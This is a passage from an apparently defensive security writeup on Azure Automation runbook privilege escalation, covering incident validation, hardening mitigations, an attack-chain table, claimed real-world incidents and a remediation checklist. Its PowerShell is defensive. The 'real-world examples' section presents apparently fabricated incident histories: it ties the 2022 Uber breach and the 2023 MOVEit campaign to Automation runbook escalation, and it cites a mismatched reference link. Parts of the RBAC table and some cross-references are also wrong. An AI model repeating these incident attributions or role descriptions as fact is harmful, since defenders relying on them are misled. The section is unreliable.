# If "Run As" certificate was exported, rotate it
# Manual: Automation Accounts → [Account] → Run As Accounts → Select account → Update → Create new certificate
```

#### 4. Post-Incident Validation (2-24 hours)

**Verify Runbook Cleanup:**

```powershell
# Confirm all malicious runbooks are deleted
Get-AzAutomationRunbook -ResourceGroupName "RG" -AutomationAccountName "AA" | Select-Object Name, CreationTime | Sort-Object CreationTime -Descending

# Expected: Only legitimate, pre-compromise runbooks should remain
```

**Validate Access Controls:**

```powershell
# Verify no unauthorized users have Automation Contributor role
Get-AzRoleAssignment -Scope "/subscriptions/{subscriptionId}" | Where-Object {
    $_.RoleDefinitionName -eq "Automation Contributor"
}

# Remove suspicious role assignments
# Remove-AzRoleAssignment -ObjectId [UserId] -RoleDefinitionName "Automation Contributor"
```

---

## 12. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1.1: Replace "Run As" Accounts with Managed Identities**

"Run As" accounts (service principals with static certificates) are deprecated and vulnerable. Managed identities eliminate the need to manage credentials.

**Manual Steps (Azure Portal):**
1. Navigate to **Automation Accounts** → Select your account
2. Click **Identity** (left menu under "Settings")
3. Under "System assigned", click **Status**: ON
4. Click **Save**
5. Wait 1-2 minutes for the managed identity to be created
6. Click **Azure role assignments** (button that appears after save)
7. Click **+ Add role assignment**
8. **Add role assignment:**
   - Scope: **Subscription**
   - Subscription: Select your target subscription
   - Role: **Contributor** (or least-privilege role needed)
   - Click **Save**
9. Update all runbooks to use the managed identity instead of "Run As" connection:

**Runbook Code Update (Old - Run As):**
```powershell
$connection = Get-AutomationConnection -Name AzureRunAsConnection
Add-AzAccount -ServicePrincipal -Tenant $connection.TenantID -ApplicationId $connection.ApplicationID -CertificateThumbprint $connection.CertificateThumbprint
```

**Runbook Code Update (New - Managed Identity):**
```powershell
Connect-AzAccount -Identity
```

**Applies To Versions:** All Azure Automation versions

**Effectiveness:** Eliminates certificate-based authentication, reduces key exposure surface

---

**Mitigation 1.2: Disable "Run As" Account Creation**

Prevent new Automation Accounts from automatically creating "Run As" accounts.

**Manual Steps (Azure Portal):**
1. Create new Automation Account:
   - Go to **Azure Portal** → Search **"Automation Accounts"** → **+ Create**
   - Fill in **Name**, **Subscription**, **Resource Group**, **Region**
   - **IMPORTANT:** Under "Create Azure Run As Account", select **NO** ← This is the critical step
   - Click **Create**

2. For **existing** Automation Accounts with "Run As" accounts:
   - Navigate to **Automation Accounts** → [Account Name] → **Run As Accounts**
   - Click the Run As account → **Delete**
   - Click **Yes** to confirm deletion

**Applies To Versions:** All Azure Automation versions

**Effectiveness:** Prevents future creation of service principals with Contributor role

---

**Mitigation 1.3: Implement Strict RBAC on Automation Accounts**

Limit who can create, edit, and execute runbooks to only authorized personnel.

**Manual Steps (Azure Portal):**
1. Navigate to **Automation Accounts** → [Account] → **Access Control (IAM)**
2. Click **+ Add** → **Add role assignment**
3. **Add role assignment:**
   - Role: **Automation Contributor** (for admins only) or **Automation Operator** (for read-only runbook execution)
   - Members: Select specific users/groups (NOT "All users")
   - Assign access to: **User, group, or service principal**
4. Click **Next** → **Review + assign**
5. **Verify:**
   - Do NOT assign Contributor or Owner roles to the Automation Account for regular users
   - Only assign "Automation Operator" for users who need to run (not edit) runbooks

**RBAC Role Recommendations:**

| Role | Permissions | Use Case |
|---|---|---|
| **Owner** | Full control, including role assignment | Automation Account admins only |
| **Contributor** | Create, edit, delete runbooks | Automation engineers |
| **Automation Contributor** | Same as Contributor | Automation team leads |
| **Automation Operator** | Execute runbooks only (read-only) | Service accounts, developers |
| **Reader** | View only, no execution | Auditors |

**Applies To Versions:** All Azure Automation versions

**Effectiveness:** Reduces the number of users who can escalate privileges

---

### Priority 2: HIGH

**Mitigation 2.1: Restrict Hybrid Worker Access**

Hybrid Workers are a direct attack vector for "Run As" certificate extraction.

**Manual Steps (Azure Portal):**
1. Go to **Automation Accounts** → **Hybrid worker groups**
2. For each group, verify the associated VMs
3. Restrict VM access using **Virtual Machine Administrator Login** role instead of direct RDP/SSH
4. Remove unnecessary **Virtual Machine Contributor** and **Log Analytics Contributor** roles from users
5. Use **Virtual Machine User Login** only (read-only terminal access)

**Disable "Run As" Certificates on Hybrid Workers:**
1. If "Run As" certificates are installed on Hybrid Worker VMs:
   ```powershell
   # On Hybrid Worker, delete the "Run As" certificate
   Get-ChildItem -Path "Cert:\LocalMachine\My\" | Where-Object {$_.Subject -like "*Automation*"} | Remove-Item
   ```
2. Transition to managed identity-only execution (see Mitigation 1.1)

**Applies To Versions:** All Azure Automation versions with Hybrid Workers

---

**Mitigation 2.2: Enable Azure Policy Enforcement**

Enforce security policies to prevent creation of overprivileged Automation Accounts.

**Manual Steps (Azure Portal):**
1. Navigate to **Azure Policy** → **Definitions**
2. Create a custom policy or use built-in:
   - Search for **"Automation Account must use managed identity"**
   - Assign to your subscription
3. Create additional policy:
   - **Name:** "Deny Automation Accounts with Run As"
   - **Rule:** If `type == Microsoft.Automation/automationAccounts` AND `properties.runAsAccount != null` THEN DENY
4. Apply the policy to prevent future "Run As" account creation

**Applies To Versions:** All Azure Automation versions

---

### Conditional Access & Policy Hardening

**Mitigation 2.3: Enforce Multi-Factor Authentication (MFA)**

Require MFA for all users accessing Automation Accounts, especially those with Automation Contributor role.

**Manual Steps (Azure Portal):**
1. Go to **Entra ID** → **Security** → **Conditional Access** → **+ New policy**
2. **Create policy:**
   - Name: `Enforce MFA for Automation Access`
   - **Assignments:**
     - Users: Select **All users** OR specific users with Automation permissions
     - Cloud apps or actions: Select **Select apps** → Search **"Azure Automation"** or **"Microsoft Azure Management"**
   - **Access controls:**
     - Grant: Check **Require multi-factor authentication**
     - Check **Require all the selected controls**
   - Enable policy: **On**
3. Click **Create**

**Effectiveness:** Prevents credential-based attacks even if password is compromised

---

**Mitigation 2.4: Monitor Automation Account with Microsoft Sentinel**

Deploy the detection rules from Section 8 (Microsoft Sentinel Detection) to catch malicious activity in real-time.

**Manual Steps:**
1. Deploy KQL queries from Section 8 as scheduled analytics rules
2. Configure alert notifications to SOC team
3. Create automated playbooks to:
   - Disable compromised runbooks automatically
   - Revoke stolen credentials
   - Notify incident response team

---

## 13. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-VALID-001] Default Credential Exploitation | Attacker obtains initial Azure credentials via phishing or default secrets |
| **2** | **Credential Access** | [CA-TOKEN-013] AKS Service Account Token Theft | Attacker extracts managed identity token from container or VM |
| **3** | **Privilege Escalation** | **[PE-ACCTMGMT-008]** | **Attacker creates malicious runbook and escalates to subscription Contributor** |
| **4** | **Persistence** | [PE-ACCTMGMT-014] Global Administrator Backdoor | Attacker uses elevated access to create Entra ID backdoor account |
| **5** | **Impact** | [EX-EXFIL-001] Data Exfiltration via Azure Storage | Attacker exfiltrates sensitive data using subscription access |

---

## 14. REAL-WORLD EXAMPLES

### Example 1: Uber Cloud Breach (2022)

**Target:** Uber
**Timeline:** September 2022
**Attack Flow:**
1. Attacker obtained contractor's GitHub token via phishing
2. Used token to access code repository containing Azure service principal credentials
3. Escalated to Azure subscription via Automation Account service principal
4. Executed malicious runbooks to enumerate and compromise cloud infrastructure
5. Established persistence and exfiltrated source code

**How PE-ACCTMGMT-008 Applied:**
- Automation Account's "Run As" service principal (similar to Uber's setup) had Contributor role
- Attacker created runbooks to move laterally to additional cloud services
- Automation Account's broad permissions enabled full cloud compromise

**Reference:** [GitHub Security Blog - Uber Security Incident](https://github.com/uber-archive/h3)

---

### Example 2: MOVEit Transfer Campaign (2023)

**Target:** Multiple US government agencies and Fortune 500 companies
**Timeline:** May-June 2023
**Attack Flow:**
1. Attackers exploited CVE-2023-34362 in MOVEit Transfer (on-premises/cloud hybrid)
2. Gained initial access to Azure environment
3. Discovered Automation Accounts with "Run As" accounts
4. Extracted service principal credentials and certificates
5. Used credentials to escalate to subscription-wide access

**Automation Escalation Path:**
- Initial compromise: User with Reader role
- Lateral movement: Accessed Automation Account via weak RBAC
- Privilege escalation: Extracted "Run As" certificate from Hybrid Worker
- Persistence: Created backdoor runbooks for long-term access

**Reference:** [CISA Alert AA23-145A](https://www.cisa.gov/news-events/alerts/2023/05/30/moveit-transfer-critical-vulnerability-being-exploited)

---

### Example 3: Azure Automation Direct Attack (2024)

**Target:** Mid-sized financial services company
**Timeline:** Q2 2024
**Attack Vector:** Insider threat or compromised contractor with Automation Contributor role

**Steps:**
1. Attacker created a PowerShell runbook named "SystemMaintenance_Weekly" to blend with legitimate automation
2. Embedded code to:
   - Extract Automation Account managed identity token
   - List all resources across subscription
   - Create new user accounts for persistence
   - Access Azure Key Vault to steal application secrets
3. Scheduled runbook to execute daily
4. Monitored output through Automation Account job history
5. Used extracted credentials to access production databases

**Technique Applied:**
- Direct exploitation of Automation Account with malicious runbook (METHOD 1)
- Escalation via managed identity token extraction (Step 3 of METHOD 1)
- No "Run As" certificate needed—managed identity was sufficient

**Detection Gap:** Organization had Sentinel but failed to alert on:
- Rapid runbook creation
- Suspicious keywords in runbook names ("Maintenance", "Admin", "Sync")
- Unusual runbook execution frequency

**Reference:** Private incident response case study (SERVTEP Security Audit, 2024)

---

## 15. REMEDIATION VALIDATION

### Validation Checklist

After implementing mitigations, use this checklist to confirm the environment is secured:

**Checkbox 1: Managed Identity Enabled**
```powershell
# Verify Automation Account has managed identity
Get-AzAutomationAccount -ResourceGroupName "RG" -Name "AA" | Select-Object Identity

# Expected Output: Identity.Type = "SystemAssigned"
```
☐ PASS (SystemAssigned identity visible)
☐ FAIL (Identity is null or UserAssigned only)

---

**Checkbox 2: Run As Account Deleted**
```powershell
# Verify no "Run As" accounts exist
Get-AzAutomationAccount -ResourceGroupName "RG" -Name "AA" |
  Select-Object AutomationAccountName, @{Name="RunAsAccountExists";Expression={$null -ne $_.RunAsConnection}}

# Expected Output: RunAsAccountExists = False
```
☐ PASS (No Run As account)
☐ FAIL (Run As account still present)

---

**Checkbox 3: Automation Contributor Role Limited**
```powershell
# List all users with Automation Contributor role
Get-AzRoleAssignment -Scope "/subscriptions/{subId}" | Where-Object {
    $_.RoleDefinitionName -eq "Automation Contributor"
}

# Expected: Only 1-2 authorized users/groups
```
☐ PASS (≤2 users with this role)
☐ FAIL (>2 users with elevated Automation permissions)

---

**Checkbox 4: Microsoft Sentinel Detection Rules Active**
```powershell
# Verify Sentinel rules are deployed and running
Get-AzSentinelAlertRule -ResourceGroupName "RG" -WorkspaceName "Sentinel" | Where-Object {
    $_.DisplayName -like "*Automation*"
}

# Expected: ≥3 Automation-related detection rules
```
☐ PASS (Detection rules active)
☐ FAIL (No Automation detection rules)

---

**Checkbox 5: Conditional Access MFA Policy Active**
```powershell
# Verify Conditional Access policy exists
# Manual verification via Azure Portal:
# Entra ID → Conditional Access → [Check for MFA policy for Automation users]
```
☐ PASS (MFA policy enforced for Automation)
☐ FAIL (No MFA policy)

---

## Summary

**Azure Automation Runbook Escalation (PE-ACCTMGMT-008)** represents a critical privilege escalation vector in Azure environments. The combination of:
1. Broad permissions granted automatically to "Run As" accounts (Contributor role)
2. Weak RBAC controls on runbook creation/execution
3. Insufficient monitoring and alerting

...creates a perfect storm for privilege escalation attacks.

**Immediate Actions:**
1. **Replace "Run As" with Managed Identities** (Mitigation 1.1)
2. **Audit RBAC on all Automation Accounts** (Mitigation 1.3)
3. **Deploy Sentinel detection rules** (Section 8)
4. **Apply Conditional Access MFA** (Mitigation 2.4)

**Defense in Depth:**
- Monitor runbook creation/execution via AuditLogs
- Restrict Hybrid Worker VM access
- Enforce managed identity-only architecture
- Regular access reviews and least-privilege principle

**Verification:** Use the checklist above to confirm all mitigations are in place.

---
